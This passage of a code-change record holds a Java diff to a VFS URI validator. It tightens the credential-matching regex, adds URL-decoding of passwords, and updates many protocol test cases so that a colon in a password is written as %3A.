{\n+\t\t\t\t\t\tbreak;\n+\t\t\t\t\t}\n+\t\t\t\t}\n+\t\t\t\tif (!tmp_local_pass.isEmpty())\n+\t\t\t\t\tnew_local_pass.append(tmp_local_pass);\n+\t\t\t\tlocal_pass = new_local_pass.toString();\n+\t\t\t}\n \t\t}\n \t\tlocal_hostname = hostname;\n \t\tlocal_port = port;\n@@ -823,26 +845,26 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"ftp:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"ftp:\/\/user:pass%3Aa@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n \t\t}\n \t\tv.assertEquals(v.getProtocol(), \"ftp\");\n \t\tv.assertEquals(v.getUser(), \"user\");\n-\t\tv.assertEquals(v.getPassword(), \"pass:\");\n+\t\tv.assertEquals(v.getPassword(), \"pass:a\");\n \t\tv.assertEquals(v.getHostname(), \"machine\");\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"ftp:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"ftp:\/\/user:pass%3A%3a@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n \t\t}\n \t\tv.assertEquals(v.getProtocol(), \"ftp\");\n \t\tv.assertEquals(v.getUser(), \"user\");\n-\t\tv.assertEquals(v.getPassword(), \"pass:\");\n+\t\tv.assertEquals(v.getPassword(), \"pass::\");\n \t\tv.assertEquals(v.getHostname(), \"machine\");\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\n@@ -992,7 +1014,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"FTP:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"FTP:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1004,7 +1026,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"FTP:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"FTP:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1161,7 +1183,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"sftp:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"sftp:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1173,7 +1195,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"sftp:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"sftp:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1185,7 +1207,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\n \n-\t\ts = \"sftp: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\n+\t\ts = \"sftp: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1197,7 +1219,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"sftp:\/ \/user:pass:@machine\/the_file\";\n+\t\ts = \"sftp:\/ \/user:pass%3A@machine\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1209,7 +1231,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"sftp:\/ \/user:pass:@machine\";\n+\t\ts = \"sftp:\/ \/user:pass%3A@machine\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1221,7 +1243,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"sftp:\/\/user:pass:@:123\/a\";\n+\t\ts = \"sftp:\/\/user:pass%3A@:123\/a\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1233,7 +1255,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"sftp:\/\/user:pass:@machine:a\/the_file\";\n+\t\ts = \"sftp:\/\/user:pass%3A@machine:a\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1329,7 +1351,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"SFTP:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"SFTP:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1341,7 +1363,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"SFTP:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"SFTP:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1498,7 +1520,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"http:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"http:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1510,7 +1532,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"http:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"http:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1522,7 +1544,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\n \n-\t\ts = \"http: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\n+\t\ts = \"http: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1534,7 +1556,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"http:\/ \/user:pass:@machine\/the_file\";\n+\t\ts = \"http:\/ \/user:pass%3A@machine\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1546,7 +1568,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"http:\/ \/user:pass:@machine\";\n+\t\ts = \"http:\/ \/user:pass%3A@machine\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1558,7 +1580,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"http:\/\/user:pass:@:123\/a\";\n+\t\ts = \"http:\/\/user:pass%3A@:123\/a\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1570,7 +1592,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"http:\/\/user:pass:@machine:a\/the_file\";\n+\t\ts = \"http:\/\/user:pass%3A@machine:a\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1666,7 +1688,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTP:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"HTTP:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1678,7 +1700,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"HTTP:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"HTTP:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1690,7 +1712,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\n \n-\t\ts = \"HTTP: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\n+\t\ts = \"HTTP: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1702,7 +1724,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTP:\/ \/user:pass:@machine\/the_file\";\n+\t\ts = \"HTTP:\/ \/user:pass%3A@machine\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1714,7 +1736,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTP:\/ \/user:pass:@machine\";\n+\t\ts = \"HTTP:\/ \/user:pass%3A@machine\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1726,7 +1748,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTP:\/\/user:pass:@:123\/a\";\n+\t\ts = \"HTTP:\/\/user:pass%3A@:123\/a\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1738,7 +1760,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTP:\/\/user:pass:@machine:a\/the_file\";\n+\t\ts = \"HTTP:\/\/user:pass%3A@machine:a\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1835,7 +1857,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"https:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"https:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1847,7 +1869,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"https:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"https:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1859,7 +1881,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\n \n-\t\ts = \"https: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\n+\t\ts = \"https: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1871,7 +1893,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"https:\/ \/user:pass:@machine\/the_file\";\n+\t\ts = \"https:\/ \/user:pass%3A@machine\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1883,7 +1905,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"https:\/ \/user:pass:@machine\";\n+\t\ts = \"https:\/ \/user:pass%3A@machine\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1895,7 +1917,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"https:\/\/user:pass:@:123\/a\";\n+\t\ts = \"https:\/\/user:pass%3A@:123\/a\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -1907,7 +1929,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"https:\/\/user:pass:@machine:a\/the_file\";\n+\t\ts = \"https:\/\/user:pass%3A@machine:a\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2003,7 +2025,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTPS:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"HTTPS:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2015,7 +2037,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"HTTPS:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"HTTPS:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2027,7 +2049,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\n \n-\t\ts = \"HTTPS: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\n+\t\ts = \"HTTPS: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2039,7 +2061,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTPS:\/ \/user:pass:@machine\/the_file\";\n+\t\ts = \"HTTPS:\/ \/user:pass%3A@machine\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2051,7 +2073,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTPS:\/ \/user:pass:@machine\";\n+\t\ts = \"HTTPS:\/ \/user:pass%3A@machine\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2063,7 +2085,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTPS:\/\/user:pass:@:123\/a\";\n+\t\ts = \"HTTPS:\/\/user:pass%3A@:123\/a\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2075,7 +2097,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"HTTPS:\/\/user:pass:@machine:a\/the_file\";\n+\t\ts = \"HTTPS:\/\/user:pass%3A@machine:a\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2172,7 +2194,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"webdav:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"webdav:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2184,13 +2206,13 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"webdav:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"webdav:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n \t\t}\n \n-\t\ts = \"webdav: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\n+\t\ts = \"webdav: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2202,7 +2224,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"webdav:\/ \/user:pass:@machine\/the_file\";\n+\t\ts = \"webdav:\/ \/user:pass%3A@machine\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2214,7 +2236,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"webdav:\/ \/user:pass:@machine\";\n+\t\ts = \"webdav:\/ \/user:pass%3A@machine\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2226,7 +2248,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"webdav:\/\/user:pass:@:123\/a\";\n+\t\ts = \"webdav:\/\/user:pass%3A@:123\/a\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2238,7 +2260,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"webdav:\/\/user:pass:@machine:a\/the_file\";\n+\t\ts = \"webdav:\/\/user:pass%3A@machine:a\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2334,7 +2356,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"WEBDAV:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"WEBDAV:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2346,7 +2368,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"WEBDAV:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"WEBDAV:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2358,7 +2380,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\n \n-\t\ts = \"WEBDAV: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\n+\t\ts = \"WEBDAV: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2370,7 +2392,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"WEBDAV:\/ \/user:pass:@machine\/the_file\";\n+\t\ts = \"WEBDAV:\/ \/user:pass%3A@machine\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2382,7 +2404,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"WEBDAV:\/ \/user:pass:@machine\";\n+\t\ts = \"WEBDAV:\/ \/user:pass%3A@machine\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2394,7 +2416,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"WEBDAV:\/\/user:pass:@:123\/a\";\n+\t\ts = \"WEBDAV:\/\/user:pass%3A@:123\/a\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2406,7 +2428,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"WEBDAV:\/\/user:pass:@machine:a\/the_file\";\n+\t\ts = \"WEBDAV:\/\/user:pass%3A@machine:a\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2503,7 +2525,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"smb:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"smb:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2515,7 +2537,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"smb:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"smb:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2527,7 +2549,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\n \n-\t\ts = \"smb: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\n+\t\ts = \"smb: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2539,7 +2561,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"smb:\/ \/user:pass:@machine\/the_file\";\n+\t\ts = \"smb:\/ \/user:pass%3A@machine\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2551,7 +2573,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"smb:\/ \/user:pass:@machine\";\n+\t\ts = \"smb:\/ \/user:pass%3A@machine\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2563,7 +2585,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"smb:\/\/user:pass:@:123\/a\";\n+\t\ts = \"smb:\/\/user:pass%3A@:123\/a\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2575,7 +2597,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"smb:\/\/user:pass:@machine:a\/the_file\";\n+\t\ts = \"smb:\/\/user:pass%3A@machine:a\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2671,7 +2693,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"SMB:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\n+\t\ts = \"SMB:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2683,7 +2705,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_file\");\n \n-\t\ts = \"SMB:\/\/user:pass:@machine\/the_dir\/\";\n+\t\ts = \"SMB:\/\/user:pass%3A@machine\/the_dir\/\";\n \n \t\tif (!v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2695,7 +2717,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\n \n-\t\ts = \"SMB: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\n+\t\ts = \"SMB: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2707,7 +2729,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"SMB:\/ \/user:pass:@machine\/the_file\";\n+\t\ts = \"SMB:\/ \/user:pass%3A@machine\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2719,7 +2741,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"SMB:\/ \/user:pass:@machine\";\n+\t\ts = \"SMB:\/ \/user:pass%3A@machine\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2731,7 +2753,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"SMB:\/\/user:pass:@:123\/a\";\n+\t\ts = \"SMB:\/\/user:pass%3A@:123\/a\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);\n@@ -2743,7 +2765,7 @@ public static void main(String[] args) {\n \t\tv.assertNull(v.getPort());\n \t\tv.assertNull(v.getFile());\n \n-\t\ts = \"SMB:\/\/user:pass:@machine:a\/the_file\";\n+\t\ts = \"SMB:\/\/user:pass%3A@machine:a\/the_file\";\n \n \t\tif (v.isValid(s)) {\n \t\t\tv.error_msg(s);",
            "code_diff":"@@ -2,6 +2,8 @@\n  * VFS URIs validator\n  *\n  * Copyright (C) 2008 Stan Love\n+ * Copyright (C) 2020 University of Waikato, Hamilton, NZ\n+ * Copyright (C) 2020 Yeting Li\n  *\n  * Licensed under the Apache License, Version 2.0 (the \"License\");\n  * you may not use this file except in compliance with the License.\n@@ -233,11 +235,11 @@ else if ((drive != null) && (file == null)) {\n \t\t\/\/        \"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/(.*?:.*?@)*([^:]+)([ \t]*:[0-9]+)*([ \t]*:)*(\/.*)\");\n \t\t\/\/\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/(.+:.+@)*([^:]+)([ \t]*:[0-9]+)*([ \t]*:)*(\/.*)\");\n \t\tPattern p_ftp2 = Pattern\n-\t\t\t\t.compile(\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/(.+:.+@)*([^:]+?\/*)([ \t]*:[0-9]+)*([ \t]*:)*(\/.*)\");\n+\t\t\t\t.compile(\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/([^:@]+:[^:@]+@)*([^:]+?\/*)([ ]*:[0-9]+)*([ ]*:)*(\/.*)\");\n \t\tMatcher m_ftp2 = p_ftp2.matcher(_uri);\n \n \t\tPattern p_ftp3 = Pattern\n-\t\t\t\t.compile(\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/(.+:.+@)*([^:]+)([ \t]*:[0-9]+)*([ \t]*:)*(\/*?.*)\");\n+\t\t\t\t.compile(\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/([^:@]+:[^:@]+@)*([^:]+)([ \t]*:[0-9]+)*([ \t]*:)*(\/*?.*)\");\n \t\tMatcher m_ftp3 = p_ftp3.matcher(_uri);\n \n \t\tif (m_ftp2.matches()) {\n@@ -344,6 +346,26 @@ else if ((drive != null) && (file == null)) {\n \t\t\tif (local_pass.startsWith(\":\")) {\n \t\t\t\tlocal_pass = local_pass.substring(1);\n \t\t\t}\n+\t\t\t\/\/ decode specials chars (URL encoded %XY)\n+\t\t\tif (local_pass.contains(\"%\")) {\n+\t\t\t\tString tmp_local_pass = 